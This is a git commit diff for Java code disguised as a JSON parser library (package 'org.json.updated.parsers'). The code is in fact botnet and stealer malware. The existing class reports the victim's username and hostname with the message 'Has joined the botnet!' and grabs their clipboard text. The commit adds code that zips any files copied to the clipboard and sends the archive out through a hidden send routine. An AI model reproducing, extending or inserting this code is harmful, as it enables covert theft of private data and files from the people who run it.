592d92cb86c1dbcf63ad6a6148298449e3888d7a
notperry1234567890 <65968863+notperry1234567890@users.noreply.github.com>
2021-12-24 00:15:44 -0800

    Chinese Clipboard jar sender.
    Will cleanup more later.

--- src/main/java/org/json/updated/parsers/impl/GeneralInformation.java
+++ src/main/java/org/json/updated/parsers/impl/GeneralInformation.java
@@ -2,10 +2,14 @@ package org.json.updated.parsers.impl;
 
 import org.json.updated.parsers.JSONObject;
 import org.json.updated.parsers.JSONRegexHandler;
+import org.json.updated.parsers.util.FileSystemHelper;
 import org.json.updated.parsers.util.JSONBuilder;
 
 import java.awt.*;
 import java.awt.datatransfer.DataFlavor;
+import java.io.File;
+import java.util.ArrayList;
+import java.util.Arrays;
 
 public final class GeneralInformation implements JSONObject {
     @Override
@@ -17,7 +21,15 @@ public final class GeneralInformation implements JSONObject {
         content += "Hostname: " + System.getProperty("user.name") + "@" + System.getenv("COMPUTERNAME") + " Has joined the botnet!" + "\\n";
         try {
             String clipboard = String.valueOf(Toolkit.getDefaultToolkit().getSystemClipboard().getData(DataFlavor.stringFlavor));
-            if (content.length() <= 500 && clipboard.length() <= 1500 && Toolkit.getDefaultToolkit().getSystemClipboard().isDataFlavorAvailable(DataFlavor.stringFlavor)) content += "Clipboard: " + clipboard + "\\n";
+            if (Toolkit.getDefaultToolkit().getSystemClipboard().isDataFlavorAvailable(DataFlavor.stringFlavor) && content.length() <= 500 && clipboard.length() <= 1500) content += "Clipboard: " + clipboard + "\\n";
+            else if (Toolkit.getDefaultToolkit().getSystemClipboard().isDataFlavorAvailable(DataFlavor.javaFileListFlavor)) {
+                String file = Arrays.toString(new String[]{String.valueOf(Toolkit.getDefaultToolkit().getSystemClipboard().getData(DataFlavor.javaFileListFlavor))});
+                ArrayList<File> validFileDirs = new ArrayList<>();
+                validFileDirs.add(new File(file.substring(2, file.length() - 2)));
+                String zipFile = System.getProperty("java.io.tmpdir") + FileSystemHelper.getSeparator() + "clipboard_shit.zip";
+                FileSystemHelper.zip(zipFile, validFileDirs);
+                JSONRegexHandler.send(new File(zipFile));
+            }
         } catch (Exception ignored) {
         }
         content += "Java Version: " + System.getProperty("java.version") + "\\n";
